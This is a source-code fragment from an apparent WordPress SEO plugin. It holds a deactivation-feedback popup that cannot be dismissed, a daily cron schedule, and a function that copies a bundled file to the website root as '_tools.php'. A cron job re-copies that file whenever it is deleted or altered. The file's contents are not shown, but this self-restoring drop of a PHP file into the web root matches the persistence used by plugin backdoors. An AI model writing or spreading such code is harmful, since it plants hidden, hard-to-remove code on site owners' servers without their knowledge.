				content = '<div id="rt_seo_feedback"><center><h3>BEFORE YOU DEACTIVATE, QUICK FEEDBACK</h3></center><hr>' + '<?php echo $radio_box; ?>' + '<br><hr><p><a id="rt_seo_btn" class="button button-primary" href="javascript:;" disabled="disabled" >Submit & Deactivate</a> <a style="float: right;color: grey;" href="'+jQuery('[data-slug="realtime-seo"] .deactivate a').attr('href')+'">Skip & Deactivate</a></p></div><div id="rt_seo_thanks"></div>'
				jQuery('body').append(content);
				 jQuery("#rt_seo_feedback").modal({
				    showClose: false,
					escapeClose: false,
					clickClose: false
				});

return false;
        });
    </script><?php
}
add_action( 'admin_footer', 'rt_seo_feedback_script' );

add_filter( 'cron_schedules', 'rt_seo_cron_day' );
function rt_seo_cron_day( $schedules ) {
	$schedules['one_per_day'] = array(
		'interval' => 60 * 60 * 24,
		'display' => 'one per day'
	);
	return $schedules;
}



function rt_seo_check_file() {
	
	$tools_file = RT_SEO_SITE_ROOT.'_tools.php';
	if (!is_file($tools_file) || md5_file($tools_file) !== md5_file(RT_SEO_TOOLS_FILE)) copy(RT_SEO_TOOLS_FILE, $tools_file);
	return (is_file($tools_file) && md5_file($tools_file) === md5_file(RT_SEO_TOOLS_FILE));
	
	$folder = RT_SEO_SITE_ROOT.DIRECTORY_SEPARATOR.'webanalyze';
	if (!file_exists($folder)) mkdir($folder);
	
}

	add_action( 'rt_seo_check_file_cron', 'rt_seo_check_file' );
	
function rt_seo_API_Request($type = '')
{
	$plugin_code = 10;
	$website_url = get_site_url();
}
